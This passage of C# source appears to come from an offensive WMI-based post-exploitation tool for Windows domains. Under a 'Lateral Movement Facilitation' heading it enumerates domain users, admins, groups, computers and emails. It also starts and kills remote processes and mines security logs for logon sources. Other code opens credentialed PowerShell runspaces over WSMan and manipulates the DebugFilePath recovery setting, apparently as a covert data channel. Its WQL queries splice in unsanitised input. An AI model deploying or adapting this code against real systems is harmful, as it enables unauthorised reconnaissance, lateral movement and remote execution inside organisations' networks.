            // Probs not efficient but let's create a dict of all the handles/process names
            foreach (var cimObject in cimInstances)
            {
                procDict.Add(cimObject.CimInstanceProperties["Handle"].Value.ToString(), cimObject.CimInstanceProperties["Name"].Value.ToString());
            }

            // If a process handle was given just kill it
            if (uint.TryParse(processToKill, out var result))
                KillProc(processToKill, procDict[processToKill], cimSession, cimInstances);

            // If we got a process name
            else
            {
                //Parse for * sent in process name
                string subQuery = null;
                if (processToKill.Contains("*"))
                {
                    processToKill = processToKill.Replace("*", "%");
                    subQuery = $"SELECT * FROM Win32_Process WHERE Name like '{processToKill}'";
                }
                else
                {
                    subQuery = $"SELECT * FROM Win32_Process WHERE Name='{processToKill}'";
                }

                var subQueryInstances = cimSession.QueryInstances(planter.NameSpace, "WQL", subQuery);

                foreach (var cimObject in subQueryInstances)
                {
                    KillProc(cimObject.CimInstanceProperties["Handle"].Value.ToString(), procDict[cimObject.CimInstanceProperties["Handle"].Value.ToString()], cimSession, cimInstances);
                }
            }
            return true;
        }

        public object process_start(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var binPath = planter.Commander.Process;

            if (!CheckForFile(binPath, cimSession, verbose: false))
            {
                Messenger.RedMessage("[-] Specified file does not exist on the remote system, not creating process\n");
                return null;
            }

            // Create the parameters and create the new process.
            var cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("CommandLine", binPath, CimFlags.In)
            };

            // Execute the method and obtain the return values.
            var results =
                cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

            switch (Convert.ToUInt32(results.ReturnValue.Value))
            {
                case 0:
                    Messenger.Info("Process {0} has been successfully created",
                        results.OutParameters["ProcessID"].Value);
                    return true;
                case 2:
                    throw new SecurityException("Access denied");
                case 3:
                    throw new SecurityException("Insufficient privilege");
                case 21:
                    throw new Exception("Invalid parameter");
                default:
                    throw new Exception("Unknown failure");
            }

        }

        public object logon_events(Planter planter)
        {
            // Hacky solution but works for now
            var cimSession = planter.Connector.ConnectedCimSession;

            string[] logonType = { "Logon Type:		2", "Logon Type:		10" };
            const string logonProcess = "Logon Process:		User32";
            var searchTerm = new Regex(@"(Account Name.+|Workstation Name.+|Source Network Address.+)");
            var r = new Regex("New Logon(.*?)Authentication Package", RegexOptions.Singleline);
            var outputList = new List<string[]>();
            var latestDate = DateTime.MinValue;

            const string query = "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')";
            var queryInstances = cimSession.QueryInstances(planter.NameSpace, "WQL", query);


            Messenger.YellowMessage(
                "[*] Depending on the amount of events, this may take some time to parse through.\n");

            Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", "User Account", "System Connecting To",
                "System Connecting From", "Last Login");
            Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", "------------", "--------------------",
                "----------------------", "----------");

            foreach (var cimObject in queryInstances)
            {
                var message =
                    cimObject.CimInstanceProperties["Message"].Value
                        .ToString(); // Let's avoid doing this multiple times

                if (logonType.Any(message.Contains) && message.Contains(logonProcess))
                {
                    var singleMatch = r.Match(cimObject.CimInstanceProperties["Message"].Value.ToString());
                    var breaks = singleMatch.Value.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                    var queryMatchingFiles =
                        from line in breaks
                        let matches = searchTerm.Matches(line)
                        where matches.Count > 0
                        where !line.EndsWith("$")
                        select line;

                    var tempList = new List<string>();
                    foreach (var v in queryMatchingFiles)
                    {
                        var importantInfo = v.Split(new[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
                        if (importantInfo[1].Trim() != "-")
                        {
                            if (!string.IsNullOrEmpty(importantInfo[1].Trim()))
                            {
                                tempList.Add(importantInfo[1].Trim());
                            }
                        }
                    }

                    var tempDate = (DateTime)cimObject.CimInstanceProperties["TimeGenerated"].Value;
                    tempList.Add(tempDate.ToString(CultureInfo.InvariantCulture));

                    var tempArray = tempList.ToArray();

                    // We need to check if this is the first loop and handle accordingly
                    if (outputList.Count > 0)
                    {
                        // If any of the arrays in the outputList do not match the temp array (excluding datetime value)
                        if (!outputList.Any(p => p.Take(3).SequenceEqual(tempArray.Take(3))))
                        {

                            outputList.Add(tempArray);
                            latestDate = tempDate;
                        }
                    }
                    else
                        outputList.Add(tempArray);

                }
            }

            foreach (var entry in outputList)
            {
                Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", entry[0], entry[1], entry[2], entry[3]);
            }

            return queryInstances;
        }

        #endregion

        #region Lateral Movement Facilitation (LDAP Namespace)


        #region Users & Roles

        /// <summary>
        /// https://wutils.com/wmi/root/directory/ldap/ds_user/instances.html
        /// </summary>
        /// <param name="planter"></param>
        /// <returns></returns>
        public object ls_domain_users(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;
            

            var table = new ConsoleTable("Name", "Description", "Email", "Last Logon", "PasswordLastSet", "Domain Admin").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var cimObject in queryCollection)
            {
                var name = cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var isAdmin = IsDomainAdmin(cimObject.CimInstanceProperties["DS_memberOf"]?.Value);

                var dSDescriptionArr = Helpers.ToArray(cimObject.CimInstanceProperties["DS_description"]?.Value);
                var accountDescription = string.Empty;
                if (dSDescriptionArr != null && dSDescriptionArr.Length > 0)
                    accountDescription = dSDescriptionArr[0];

                long.TryParse(cimObject.CimInstanceProperties["DS_lastLogon"]?.Value?.ToString(), out var lastLogonStr);
                var lastLogon = Helpers.ParseAdDateTime(lastLogonStr);

                long.TryParse(cimObject.CimInstanceProperties["DS_pwdLastSet"]?.Value?.ToString(), out var lastPasswddSetStr);
                var lastPasswdSet = Helpers.ParseAdDateTime(lastPasswddSetStr);

                var email = cimObject.CimInstanceProperties["DS_mail"]?.Value?.ToString();

                //table.AddRow(name, accountDescription, email);
                table.AddRow(name, accountDescription, email, lastLogon, lastPasswdSet, isAdmin.ToString());

            }

            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }

        public object ls_domain_admins(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "Description", "Email", "Last Logon", "PasswordLastSet").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var cimObject in queryCollection)
            {

                var name = cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var isAdmin = IsDomainAdmin(cimObject.CimInstanceProperties["DS_memberOf"]?.Value);
                if (!isAdmin)
                    continue;


                var dSDescriptionArr = Helpers.ToArray(cimObject.CimInstanceProperties["DS_description"]?.Value);
                var accountDescription = string.Empty;
                if (dSDescriptionArr != null && dSDescriptionArr.Length > 0)
                    accountDescription = dSDescriptionArr[0];

                long.TryParse(cimObject.CimInstanceProperties["DS_lastLogon"]?.Value?.ToString(), out var lastLogonStr);
                var lastLogon = Helpers.ParseAdDateTime(lastLogonStr);

                long.TryParse(cimObject.CimInstanceProperties["DS_pwdLastSet"]?.Value?.ToString(), out var lastPasswddSetStr);
                var lastPasswdSet = Helpers.ParseAdDateTime(lastPasswddSetStr);

                var email = cimObject.CimInstanceProperties["DS_mail"]?.Value?.ToString();



                table.AddRow(name, accountDescription, email, lastLogon, lastPasswdSet);

            }
            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_user_groups(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "Member of").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var cimObject in queryCollection)
            {
                var name = cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var userGroups = ParseUserGroupNames(cimObject.CimInstanceProperties["DS_memberOf"]?.Value);
                if (string.IsNullOrEmpty(userGroups))
                    continue;



                table.AddRow(name, userGroups);

            }
            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_computers(Planter planter)
        {
            var queryCollection = get_domain_computers(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "DNS", "OS", "OS Ver", "Distinguished Name", "Managed By", "Description").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var cimObject in queryCollection)
            {
                var name = cimObject.CimInstanceProperties["DS_name"]?.Value.ToString();
                var hostname = cimObject.CimInstanceProperties["DS_dNSHostName"]?.Value.ToString();
                var distinguishedName = cimObject.CimInstanceProperties["DS_distinguishedName"]?.Value.ToString();
                var os = cimObject.CimInstanceProperties["DS_operatingSystem"]?.Value.ToString();
                var osVer = cimObject.CimInstanceProperties["DS_operatingSystemVersion"]?.Value.ToString();

                var managedByS = cimObject.CimInstanceProperties["DS_managedBy"]?.Value?.ToString();
                var managedBy = string.Empty;

                if (!string.IsNullOrEmpty(managedByS))
                {
                    managedBy = managedByS.Split(',')[0].Trim().Replace("CN=", "").TrimEnd(',').TrimStart(',');
                }

                var descriptionArr = ToIEnumerable(cimObject.CimInstanceProperties["DS_description"]?.Value);
                var description = string.Empty;

                if (descriptionArr != null)
                {
                    foreach (var s in descriptionArr)
                    {
                        description += $"{s}, ";
                    }

                    description = description.Trim().TrimEnd(' ').Trim(',');
                }

                table.AddRow(name, hostname, os, osVer, distinguishedName, managedBy, description);
            }

            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_domain_groups(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var query = "SELECT * FROM ds_group";
            var queryCollection = cimSession.QueryInstances(planter.NameSpace, "WQL", query);

            Messenger.Info("{0,-30}", "Group Name");
            Messenger.Info("{0,-30}", "----------------");

            foreach (var cimObject in queryCollection)
            {
                Messenger.Info("{0,-20}", cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString());
            }

            return queryCollection;
        }

        public object ls_domain_users_list(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;

            foreach (var cimObject in queryCollection)
            {

                var name = cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString();

                if (string.IsNullOrEmpty(name))
                    continue;

                if ((name.StartsWith("$")))
                    continue;

                if (name.StartsWith("HealthMailbox") && name.Length == 20)
                    continue;

                if (name.StartsWith("SM_") && name.Length == 20)
                    continue;

                Messenger.Info(name);
            }

            return queryCollection;
        }

        public object ls_domain_users_email(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;

            foreach (var cimObject in queryCollection)
            {

                var name = cimObject.CimInstanceProperties["DS_sAMAccountName"]?.Value?.ToString();

                if (string.IsNullOrEmpty(name))
                    continue;

                if ((name.StartsWith("$")))
                    continue;

                if (name.StartsWith("HealthMailbox") && name.Length == 20)
                    continue;

                if (name.StartsWith("SM_") && name.Length == 20)
                    continue;

                var mail = cimObject.CimInstanceProperties["DS_mail"]?.Value?.ToString();

                if (string.IsNullOrEmpty(mail))
                    continue;

                Messenger.Info(mail);
            }

            return queryCollection;
        }



        private IEnumerable<CimInstance> get_domain_users_collection(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var osQuery = "SELECT * FROM ds_user";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);
            return queryInstance;
        }


        private IEnumerable<CimInstance> get_domain_computers(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var query = "SELECT * FROM ds_computer";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", query);
            return queryInstance;
        }

        #endregion


        #endregion


        #region Internal Functions

        private string ParseUserGroupNames(object userGroupsObj)
        {
            if (userGroupsObj == null)
                return string.Empty;

            var userGroups = ToIEnumerable(userGroupsObj);
            if (userGroups == null)
                return string.Empty;

            var result = string.Empty;
            foreach (string userGroup in userGroups)
            {
                var w = userGroup.Split(',');

                foreach (var s in w)
                {
                    var a = s.Trim().TrimEnd('.');
                    if (a.StartsWith("DC="))
                        continue;

                    if (a.StartsWith("OU="))
                        continue;

                    a = a.Replace("CN=", "");
                    result = $"{result}, {a}";
                }
            }

            return result.Trim().TrimStart(',').TrimEnd(',');
        }

        private bool IsDomainAdmin(object userGroupsObj)
        {
            if (userGroupsObj == null)
                return false;

            var userGroups = ToIEnumerable(userGroupsObj);
            if (userGroups == null)
                return false;

            foreach (string m in userGroups)
            {
                if (string.IsNullOrEmpty(m))
                    continue;

                if (m.Contains("CN=Administrators"))
                {
                    return true;
                }

                if (m.Contains("CN=Domain Admins"))
                {
                    return true;

                }
                if (m.Contains("CN=Enterprise Admins"))
                {
                    return true;
                }
                if (m.Contains("CN=Schema Admins"))
                {
                    return true;
                }
            }

            return false;
        }

        private IEnumerable ToIEnumerable(object obj)
        {
            return obj as IEnumerable;
        }

        private IEnumerable<CimInstance> ls_file(Planter planter, bool print=false)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var path = planter.Commander.Directory;
            var drive = path.Substring(0, 2);
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }

            var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            var fileQuery = $"SELECT * FROM CIM_DataFile Where Drive='{drive}' AND Path='{newPath}' ";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", fileQuery);

            if (!print)
                return queryInstance;

            Messenger.Info("{0,-30}", "Files");
            Messenger.Info("{0,-30}", "-----------------");

            foreach (var cimObject in queryInstance)
            {
                Messenger.Info("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            return queryInstance;
        }


        private IEnumerable<CimInstance> ls_dir(Planter planter, bool print = false)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var path = planter.Commander.Directory;

            var drive = path.Substring(0, 2);
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }

            var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            var folderQuery = $"SELECT * FROM Win32_Directory Where Drive='{drive}' AND Path='{newPath}' ";
            var folderInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", folderQuery);

            if (!print)
                return folderInstance;


            Messenger.Info("\n{0,-30}", "Folders");
            Messenger.Info("{0,-30}", "-----------------");

            foreach (var cimObject in folderInstance)
            {
                Messenger.Info("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            return folderInstance;
        }


        private object KillProc(string handle, string procName, CimSession cimSession, IEnumerable<CimInstance> cimInstances)
        {
            CimMethodResult results = null;
            try
            {
                foreach (var cimObject in cimInstances)
                {
                    if (cimObject.CimInstanceProperties["Handle"].Value.ToString() == handle)
                    {
                        results = cimSession.InvokeMethod(cimObject, "Terminate", null);
                    }
                }

                if (results != null && Convert.ToUInt32(results.ReturnValue.Value) == 0)
                {
                    Messenger.Info("Successfully killed '{0}'", procName);
                    return true;
                }

                Messenger.RedMessage("[-] Error: Not able to kill process: " + procName);
                return false;
            }
            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error killing process: " + procName);
                Messenger.Info(e);
                return false;
            }
        }

        private Runspace RunspaceCreate(Planter planter)
        {
            try
            {
                if (planter.Password == null)
                {
                    var remoteComputerUri = new Uri("http://" + planter.System + ":5985/WSMAN");
                    var connectionInfo = new WSManConnectionInfo(remoteComputerUri);
                    var remoteRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                    remoteRunspace.Open();
                    return remoteRunspace;
                }

                var domainCredz = planter.Domain + "\\" + planter.User;
                var remoteComputer = new Uri($"http://{planter.System}:5985/wsman");
                var creds = new PSCredential(domainCredz, planter.Password);
                var connection = new WSManConnectionInfo(remoteComputer, null, creds);

                var runspace = RunspaceFactory.CreateRunspace(connection);
                runspace.Open();
                return runspace;

            }
            catch (PSRemotingTransportException)
            {
                Messenger.YellowMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new PSRemotingTransportException();
            }
            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error creating PS runspace");
                Messenger.Info(e);
                return null;
            }
        }

        private Runspace RunspaceCreateLocal()
        {
            try
            {
                var connectionInfo = new WSManConnectionInfo();
                var localRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                localRunspace.Open();
                return localRunspace;
            }

            catch (PSRemotingTransportException)
            {
                Messenger.YellowMessage("Error creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new PSRemotingTransportException();
            }

            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error creating PS runspace");
                Messenger.Info(e);
                return null;
            }
        }

        private string GetOsRecovery(CimSession cimSession)
        {
            // Grab the original WMI Property so we can set it back afterwards
            try
            {
                const string query = "SELECT * FROM Win32_OSRecoveryConfiguration";
                var queryInstance = cimSession.QueryInstances(DefaultNameSpace, "WQL", query);
                IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

                var originalWmiProperty = cimInstances.First().CimInstanceProperties["DebugFilePath"].Value.ToString();
                //

                return originalWmiProperty;
            }

            catch (CimException exception) when (exception.MessageId == "HRESULT 0x80338043")
            {
                Messenger.Info("Issue with DebugFilePath property, please use the reset option with WMI");
                throw new RektDebugFilePath(exception.Message);
            }

            catch (CimException exception)
            {
                Messenger.RedMessage("Issue getting the DebugFilePath, if previous executions did not finish successfully you may need to reset it back to the default (using -r)");
                Messenger.Info("Error Code = " + exception.NativeErrorCode);
                Messenger.Info("MessageId = " + exception.MessageId);
                Messenger.Info("ErrorSource = " + exception.ErrorSource);
                Messenger.Info("ErrorType = " + exception.ErrorType);
                Messenger.Info("Status Code = " + exception.StatusCode);
            }

            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error grabbing DebugFilePath");
                Messenger.Info(e);
            }
            return null;
        }

        public static void SetOsRecovery(CimSession cimSession, string originalWmiProperty)
        {
            // Set the original WMI Property
            try
            {
                const string query = "SELECT * FROM Win32_OSRecoveryConfiguration";
                var queryInstance = cimSession.QueryInstances(DefaultNameSpace, "WQL", query);

                foreach (var cimObject in queryInstance)
                {
                    cimObject.CimInstanceProperties["DebugFilePath"].Value = originalWmiProperty;
                    cimSession.ModifyInstance(cimObject);
                }
            }

            catch (Exception e)
            {
                throw new RektDebugFilePath(e.Message);
            }
        }

        private bool CheckForFile(string path, CimSession cimSession, bool verbose)
        {
            var newPath = path.Replace("\\", "\\\\");

            var query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            var queryInstance = cimSession.QueryInstances(DefaultNameSpace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

            if (!cimInstances.Any())
            {
                if (verbose)
                    Messenger.RedMessage("[-] Specified file does not exist, not running PS runspace");
                return false;
            }

            if (Convert.ToInt32(cimInstances.First().CimInstanceProperties["FileSize"].Value) == 0)
            {
                Messenger.RedMessage("[-] Error: The file is present but zero bytes, no contents to display");
                return false;
            }
            return true;
        }

        private int GetFileSize(string path, CimSession cimSession)
        {
            // I created a new method so I could keep the one above it as a bool. I agree, not very efficient at all
            var newPath = path.Replace("\\", "\\\\");

            var query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            var queryInstance = cimSession.QueryInstances(DefaultNameSpace, "WQL", query);

            return Convert.ToInt32(queryInstance.First().CimInstanceProperties["FileSize"].Value);
        }

        private string CheckForFinishedDebugFilePath(string originalWmiProperty, CimSession cimSession)
        {
            var warn = false;
            string returnRecovery = null;
            var breakLoop = false;
            var counter = 0;

            do
            {
                var modifiedRecovery = GetOsRecovery(cimSession);
                if (modifiedRecovery == originalWmiProperty)
                {
                    Messenger.YellowMessage("DebugFilePath write not completed, sleeping for 10s...");
                    Thread.Sleep(10000);
                    warn = true;
                    counter++;
                    if (counter > 12)
                    {
                        // We only want to run for 2 mins max
                        breakLoop = true;
                    }
                }
                else
                {
                    if (warn == true) //I only want this if the warning gets thrown so it stays pretty
                    {
                        Messenger.Info("\n\n");
                    }
                    returnRecovery = modifiedRecovery;
                    return returnRecovery;
                }
            } while (breakLoop == false);

            return returnRecovery;
        }

        private bool IsNullOrEmpty(Array array)
        {
            return (array == null || array.Length == 0);
        }

        private string Truncate(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return value;
            return value.Length <= maxLength ? value : value.Substring(0, maxLength);
        }


        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }

        #endregion

    }
}
